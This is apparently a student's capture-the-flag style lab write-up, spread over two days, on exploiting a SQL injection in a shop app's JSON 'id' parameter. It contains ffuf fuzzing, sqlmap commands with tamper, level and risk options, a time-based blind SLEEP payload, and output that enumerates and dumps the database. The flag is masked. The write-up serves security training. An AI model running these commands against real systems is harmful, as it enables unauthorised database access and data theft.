# Brief

You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.


# Questions

1.  What's the contents of table final_flag?

```sh
# Access the target
http://94.237.122.117:39562


# See that it's a web app. We need an entry point. Fuzz?
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.122.117:39562/FUZZ


# Nothing. None of the requests are leading anywhere. So, we need to examine them carefully. In fact, the only functionality working is adding to cart. Find the post request to action.php
curl 'http://94.237.122.117:33850/action.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.122.117:39562/shop.html' -H 'Content-Type: application/json' -H 'Origin: http://94.237.122.117:39562' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Sec-GPC: 1' -H 'Priority: u=0' --data-raw '{"id":1}'

# Copy and save 
cat req.txt

POST /action.php HTTP/1.1
Host: 94.237.122.117:39562
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.122.117:39562/shop.html
Content-Type: application/json
Content-Length: 8
Origin: http://94.237.122.117:39562
DNT: 1
Connection: keep-alive
Sec-GPC: 1
Priority: u=0

{"id":1}


# Run sqlmap basic to get the schema
sqlmap -r req.txt --schema

[22:07:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:08:03] [INFO] (custom) POST parameter 'JSON id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:08:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:08:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:08:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[22:08:12] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[22:08:17] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[22:08:22] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[22:08:26] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[22:08:30] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[22:08:34] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[22:08:38] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[22:08:43] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[22:08:47] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[22:08:51] [INFO] checking if the injection point on (custom) POST parameter 'JSON id' is a false positive
[22:09:03] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 2203 HTTP(s) requests:

Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 2632 FROM (SELECT(SLEEP(5)))OsJp)\"}

[22:10:48] [INFO] the back-end DBMS is MySQL
[22:10:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[22:10:48] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[22:11:00] [INFO] enumerating database management system schema
[22:11:00] [INFO] fetching database names
[22:11:00] [INFO] fetching number of databases
[22:11:01] [INFO] falling back to current database
[22:11:01] [INFO] fetching current database
[22:11:01] [INFO] retrieved: 
[22:11:02] [CRITICAL] unable to retrieve the database names


# No data. Tailor sqlmap
sqlmap -r req.txt --technique=BEU --tamper=between --dump --batch  


# Took forever. Expand levels, risk, reduce request timer
sqlmap -r req.txt --technique=BEU --level=5 --risk=3 --tamper=between --dump --batch --no-cast --time-sec=3


# No response. Change the request format
sqlmap -u 'http://94.237.122.117:33850/action.php' --data '{"id":1}' --technique=BEU --level=5 --risk=3 --tamper=between --dump --batch --no-cast --time-sec=3


# Still nothing. Last try
sqlmap 'http://94.237.122.117:33850/action.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.122.117:33850/shop.html' -H 'Content-Type: application/json' -H 'Origin: http://94.237.122.117:33850' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Sec-GPC: 1' -H 'Priority: u=0' --data-raw '{"id":1}' --technique=BEU --tamper=between --dump-all --exclude-sysdbs --batch --no-cast --time-sec=3


# Nothing. Break here for the day
```

# Resuming day 2

</br>

```sh
# So, when I use the basic options, it seems to recognize that the parameter is vulnerable. When I add filtering, it fails. Start from the last known good 
sqlmap -r req.txt --schema --banner --current-user --current-db --is-dba


JSON data found in POST body. Do you want to process it? [Y/n/q] y
[17:05:40] [INFO] resuming back-end DBMS 'mysql' 
[17:05:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 8278 FROM (SELECT(SLEEP(5)))vaAw)\"}

web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)


# I kept on deleting the history file but then I realized that it might be better to build on top of it instead. Since it has the previous injection point.
sqlmap -r req.txt --schema --banner --batch --no-cast --tamper=between --dump-all --exclude-sysdb

[*] starting @ 17:22:20 /2025-07-25/

[17:22:20] [INFO] parsing HTTP request from 'req.txt'
[17:22:20] [INFO] loading tamper module 'between'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[17:22:20] [INFO] resuming back-end DBMS 'mysql' 
[17:22:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 8278 FROM (SELECT(SLEEP(5)))vaAw)\"}
---
[17:22:21] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:22:21] [INFO] the back-end DBMS is MySQL
[17:22:21] [INFO] fetching banner
[17:22:21] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done) 
[17:22:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
17:22:44] [INFO] adjusting time delay to 2 seconds due to good response times
0.3.23-MariaDB-0+deb10u1
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
banner: '10.3.23-MariaDB-0+deb10u1'
[17:25:52] [INFO] enumerating database management system schema
[17:25:52] [INFO] fetching database names
[17:25:52] [INFO] fetching number of databases
[17:25:52] [INFO] retrieved: 2
[17:25:58] [INFO] retrieved: information_schema
[17:28:19] [INFO] retrieved: ******
[17:29:44] [INFO] fetching tables for databases: 'information_schema, ******'
[17:29:44] [INFO] skipping system database 'information_schema'
[17:29:44] [INFO] fetching number of tables for database '******'
[17:29:44] [INFO] retrieved: 5
[17:29:50] [INFO] retrieved: ******
[17:31:12] [INFO] retrieved: order_items
[17:32:43] [INFO] retrieved: products
[17:33:52] [INFO] retrieved: categories
[17:35:02] [INFO] retrieved: brands
[17:35:45] [INFO] fetched tables: '******.categories', '******.products', '******.******', '******.brands', '******.order_items'
[17:35:45] [INFO] fetching columns for table 'categories' in database '******'
[17:35:45] [INFO] retrieved: 2
[17:35:51] [INFO] retrieved: category_id
[17:37:18] [INFO] retrieved: int(11)
[17:38:21] [INFO] retrieved: categor


# I think we can now go for the kill given the DB and table names 
sqlmap -r req.txt --dump -D ****** -T ****** --batch --no-cast --tamper=between 

do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
Y
2
[17:42:46] [INFO] retrieved: 
[17:42:51] [INFO] adjusting time delay to 2 seconds due to good response times
id
[17:43:05] [INFO] retrieved: content
[17:44:05] [INFO] fetching entries for table '******' in database '******'
[17:44:05] [INFO] fetching number of entries for table '******' in database '******'
[17:44:05] [INFO] retrieved: 1
[17:44:09] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
******
[17:47:50] [INFO] retrieved: 1
Database: production
Table: ******
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | ****** |
+----+--------------------------+
```
